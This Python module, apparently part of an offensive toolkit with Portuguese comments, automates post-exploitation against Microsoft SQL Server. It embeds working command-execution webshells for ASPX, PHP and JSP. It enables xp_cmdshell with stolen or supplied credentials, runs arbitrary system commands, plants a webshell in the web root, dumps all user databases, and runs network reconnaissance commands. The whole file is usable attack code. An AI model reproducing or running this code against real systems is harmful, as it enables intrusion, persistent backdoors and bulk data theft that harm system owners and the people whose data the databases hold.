# core/post_exploit.py
import pymssql
import requests
import subprocess
import os
import base64

class PostExploitation:
    def __init__(self):
        self.webshells = {
            'aspx': '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        Response.Write(proc.StandardOutput.ReadToEnd());
    }
%>''',
            
            'php': '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    die;
}
?>''',
            
            'jsp': '''<%@ page import="java.util.*,java.io.*"%>
<%
if(request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while(disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>'''
        }

    def enable_xp_cmdshell(self, target, port, user, password):
        """Habilita xp_cmdshell no MSSQL"""
        try:
            conn = pymssql.connect(server=target, port=port, user=user, password=password)
            cursor = conn.cursor()
            
            commands = [
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            ]
            
            for cmd in commands:
                cursor.execute(cmd)
            
            conn.commit()
            conn.close()
            print(f"[+] xp_cmdshell habilitado em {target}")
            return True
            
        except Exception as e:
            print(f"[-] Erro ao habilitar xp_cmdshell: {str(e)}")
            return False

    def execute_via_xp_cmdshell(self, target, port, user, password, command):
        """Executa comandos via xp_cmdshell"""
        try:
            conn = pymssql.connect(server=target, port=port, user=user, password=password)
            cursor = conn.cursor()
            
            cursor.execute(f"EXEC xp_cmdshell '{command}'")
            result = cursor.fetchall()
            
            conn.close()
            return '\n'.join([str(row) for row in result if row[0]])
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def upload_webshell(self, target, port, user, password, web_root):
        """Faz upload de webshell"""
        try:
            # Detecta tecnologia
            tech = self.detect_technology(target, port)
            
            if tech in self.webshells:
                webshell_content = self.webshells[tech]
                filename = f"shell.{tech}"
                
                # Comando para criar arquivo
                if tech == 'aspx':
                    cmd = f'echo "{webshell_content}" > "{web_root}\\{filename}"'
                else:
                    cmd = f'echo "{webshell_content}" > "{web_root}/{filename}"'
                
                result = self.execute_via_xp_cmdshell(target, port, user, password, cmd)
                print(f"[+] Webshell uploaded: {web_root}/{filename}")
                return True
                
        except Exception as e:
            print(f"[-] Erro no upload: {str(e)}")
            return False

    def detect_technology(self, target, port):
        """Detecta tecnologia do servidor web"""
        try:
            url = f"http://{target}:{port}" if port != 443 else f"https://{target}"
            response = requests.get(url, timeout=5, verify=False)
            
            headers = response.headers
            if 'X-Powered-By' in headers:
                if 'PHP' in headers['X-Powered-By']:
                    return 'php'
                elif 'ASP.NET' in headers['X-Powered-By']:
                    return 'aspx'
            
            # Verifica por extens√µes na URL
            if any(ext in response.text for ext in ['.aspx', '.asp']):
                return 'aspx'
            elif any(ext in response.text for ext in ['.jsp', '.java']):
                return 'jsp'
            else:
                return 'php'
                
        except:
            return 'php'  # Default

    def dump_database(self, target, port, user, password):
        """Faz dump completo do banco"""
        try:
            conn = pymssql.connect(server=target, port=port, user=user, password=password)
            cursor = conn.cursor()
            
            # Lista todos os bancos
            cursor.execute("SELECT name FROM sys.databases")
            databases = [row[0] for row in cursor.fetchall()]
            
            dump_data = {}
            for db in databases:
                if db not in ['master', 'tempdb', 'model', 'msdb']:
                    cursor.execute(f"USE {db}")
                    
                    # Lista tabelas
                    cursor.execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES")
                    tables = [row[0] for row in cursor.fetchall()]
                    
                    db_data = {}
                    for table in tables:
                        try:
                            cursor.execute(f"SELECT * FROM {table}")
                            rows = cursor.fetchall()
                            db_data[table] = rows
                        except:
                            continue
                    
                    dump_data[db] = db_data
            
            conn.close()
            return dump_data
            
        except Exception as e:
            return f"Erro no dump: {str(e)}"

    def lateral_movement(self, target, port, user, password):
        """Tenta movimento lateral na rede"""
        commands = [
            'arp -a',
            'net view',
            'net localgroup administrators',
            'net user',
            'ipconfig /all',
            'netstat -ano'
        ]
        
        results = {}
        for cmd in commands:
            result = self.execute_via_xp_cmdshell(target, port, user, password, cmd)
            results[cmd] = result
        
        return results